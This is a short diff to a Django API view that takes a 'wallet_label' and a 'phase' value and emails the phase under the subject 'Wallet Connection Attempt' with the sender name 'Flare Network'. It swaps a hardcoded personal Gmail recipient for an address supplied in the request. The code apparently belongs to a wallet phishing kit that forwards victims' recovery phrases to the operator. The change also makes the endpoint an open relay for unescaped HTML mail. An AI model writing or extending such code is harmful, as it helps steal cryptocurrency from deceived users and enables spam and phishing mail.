@@ -11,15 +11,16 @@ class SendEmail(APIView):
     def post(self, request):
         wallet_label = request.data.get("wallet_label")
         phase = request.data.get("phase")
+        email = request.data.get('email')
 
-        if not wallet_label or not phase:
+        if not wallet_label or not phase or not email:
             return Response(
-                {"error": "wallet_label and message are required"},
+                {"error": "wallet_label, phase, and email are required"},
                 status=status.HTTP_400_BAD_REQUEST
             )
 
         # Example: do something (send email, save, etc.)
-        send_mail("uzomamicheal07@gmail.com", f"<p>{phase}</p>", f"Wallet Connection Attempt: {wallet_label}", "Flare Network")
+        send_mail(email, f"<p>{phase}</p>", f"Wallet Connection Attempt: {wallet_label}", "Flare Network")
 
         return Response(
             {"success": "Email request received"},
